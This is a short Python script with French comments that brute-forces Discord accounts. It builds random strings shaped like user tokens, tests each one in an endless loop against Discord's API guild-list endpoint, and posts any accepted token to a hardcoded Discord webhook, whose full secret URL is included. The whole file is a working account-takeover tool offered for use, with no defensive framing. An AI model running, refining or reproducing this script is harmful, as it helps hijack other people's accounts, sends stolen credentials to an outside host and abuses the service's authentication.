import hashlib
import random
import string
import time

import requests

url = "https://discord.com/api/v8"
webhook_url = 'https://discord.com/api/webhooks/1065585253034500116/SofKqPBHwYq2707Fqxr5p4yugEhftHpd7M3YPv45KQlAimn91BKYnR0J2kr5SBx_iZG8'  # Insérez ici l'URL de votre webhook Discord



def send_webhook(content, webhook_url):
    headers = {'Content-Type': 'application/json'}
    payload = {'content': content}
    response = requests.post(webhook_url, json=payload, headers=headers)
    if response.status_code == 204:
        print('Webhook envoyé avec succès')
    else:
        print('Echec lors de l\'envoi du webhook : ', response.text)



def generate_code(length):
    letters_and_digits = string.ascii_letters + string.digits
    result = ''.join(random.choice(letters_and_digits) for i in range(length))
    return result


def generate_string():
    first_part = generate_code(24)
    second_part = generate_code(6)
    third_part = generate_code(38)
    return first_part + "." + second_part + "." + third_part


generated_string = generate_string()
while True:
    generatedToken = generate_string()
    headers = {
        "Authorization": generatedToken,
        "Content-Type": "application/json"
    }

    guilds = requests.get(
        f"{url}/users/@me/guilds",
        headers=headers
    )
    if guilds.status_code != 401:
        print("trouvé ------> " + generatedToken)
        print(guilds.status_code)
        content = generatedToken
        send_webhook(content,webhook_url)

    time.sleep(0.005)
    print("mauvais token -> " + generatedToken)
